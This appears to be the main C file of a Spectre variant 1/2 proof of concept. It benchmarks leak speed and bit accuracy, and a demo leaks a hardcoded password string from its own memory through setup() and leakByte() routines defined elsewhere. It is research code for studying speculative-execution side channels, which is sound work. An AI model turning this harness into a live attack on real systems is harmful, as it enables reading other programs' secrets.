#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/time.h>

#include "config.h"
#include "spectre.h"
#include "timing.h"

// parity of all bytes from 0 to 255 (used to calculate amount of correctly leaked bits)
char parity[] = {
    0, 1, 1, 2, 1, 2, 2, 3, 1, 2, 2, 3, 2, 3, 3, 4, 1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5, 1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7, 1, 2, 2, 3, 2, 3, 3, 4, 2, 3, 3, 4, 3, 4, 4, 5, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7, 2, 3, 3, 4, 3, 4, 4, 5, 3, 4, 4, 5, 4, 5, 5, 6, 3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7, 3, 4, 4, 5, 4, 5, 5, 6, 4, 5, 5, 6, 5, 6, 6, 7, 4, 5, 5, 6, 5, 6, 6, 7, 5, 6, 6, 7, 6, 7, 7, 8
};

void benchmark(){
    struct timeval start_time;
    struct timeval end_time;

    int correct = 0;
    int amount = 10240;

    // secret value to leak
    char secret[VALUES + 1];
    
    // character to leak
    #define leak 'q'
    
    // setup public string
    char* pub = malloc(1024);
    for(int i = 0; i < 1024; i++){
        pub[i] = 'A';
    }
    pub[1023] = 0; /* string terminator */

    // setup secret
    for(int i = 0; i < VALUES + 1; i++){
        secret[i] = leak;
    }
    secret[VALUES] = 0; /* string terminator */

    // setup PoC (eviction sets, etc.) and measure setup time
    gettimeofday(&start_time, NULL);
    setup(pub, secret);
    gettimeofday(&end_time, NULL);
    int setup_time = (end_time.tv_sec - start_time.tv_sec) * 1000 + (end_time.tv_usec - start_time.tv_usec) / 1000;

    // first index to leak
    int leak_start;

#if VARIANT == 1
    leak_start = strlen(pub) + 1;
#else
    leak_start = 0;
#endif

    // leak values and measure correct bits as well as runtime
    gettimeofday(&start_time, NULL);
    for(int i = 0; i < amount / VALUES; i++){
        for(int j = 0; j < VALUES; j++){
            int leaked = leakByte(leak_start + j);
            correct += 8 - parity[leak ^ leaked];
        }
    }
    gettimeofday(&end_time, NULL);
    int leak_time = (end_time.tv_sec - start_time.tv_sec) * 1000 + (end_time.tv_usec - start_time.tv_usec) / 1000;

    // print stats
    printf("leaked %d byte in %d ms. (%.2f bytes/s) correct: %d / %d bits (%.2f %%)\n", amount, leak_time, 1000.0 *(double)amount/(double)leak_time, correct, amount * 8, (double)correct * 12.5 / (double)amount);
    printf("setup took: %d ms.\n", setup_time);
    
    // don't leak memory :)
    free(pub);
}




int main(int argc, char** argv){
    // some timers require setup (e.g. starting the background thread)
    timer_start();
    printf("[Spectre Variant %d]\n", VARIANT);
    
#if BENCHMARK == 1
    benchmark();
#else
    /* just run small proof of concept to leak a string */
    
    char* public = "ABC";
    char* secret = "S3cret P4ssword, really!!";
    
    int secret_size = strlen(secret);
    int leak_start;

#if VARIANT == 1
    // first byte to leak is located after public string
    leak_start  = strlen(public) + 1;
#else
    // first byte to leak is at index 0
    leak_start = 0;
#endif

    char* leaked = malloc(secret_size);
    
    struct timeval start_time;
    struct timeval end_time;
    
    int millis;
    
    puts(" ---- SETUP ---- ");
    fflush(stdout);
    
    setup(public, secret);
    
    puts("");
    
    puts(" ---- LEAKING ----");
    fflush(stdout);
    
    gettimeofday(&start_time, NULL);
    for(int i = 0; i < secret_size; i++){
        leaked[i] = leakByte(leak_start + i);
    }
    gettimeofday(&end_time, NULL);
    
    millis = (end_time.tv_sec - start_time.tv_sec) * 1000 + (end_time.tv_usec - start_time.tv_usec) / 1000;
    
    puts("");
    puts(" ---- RESULT ----");
    for(int i = 0; i < secret_size; i++){
        putchar(leaked[i]);
    }
    putchar('\n');
    printf("leaked %d bytes in %dms. (%.2f bytes / sec)", secret_size, millis, (double)secret_size / millis * 1000.0);
    puts("");
    
#endif /* BENCHMARK */

    // clean up timer :)
    timer_stop();

    return 0;
}

